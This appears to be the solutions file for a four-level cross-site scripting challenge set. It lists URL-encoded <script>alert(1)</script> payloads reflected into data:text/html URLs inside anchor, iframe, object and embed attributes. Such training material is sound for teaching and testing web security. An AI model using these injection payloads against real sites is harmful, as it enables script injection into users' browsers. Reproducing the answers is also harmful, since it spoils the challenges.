# dataurl — solutions

Reflections into data:text/html sinks via href / src / data attributes.

### dataurl-level1

`/dataurl/level1/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: inside `<a href='data:text/html,...'>` — executes when victim clicks

### dataurl-level2

`/dataurl/level2/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: inside `<iframe src='data:text/html;...,'>` — iframe document executes

### dataurl-level3

`/dataurl/level3/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: inside `<object data='data:text/html,...'>` — object document executes

### dataurl-level4

`/dataurl/level4/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: inside `<embed src='data:text/html,...'>` — embed document executes
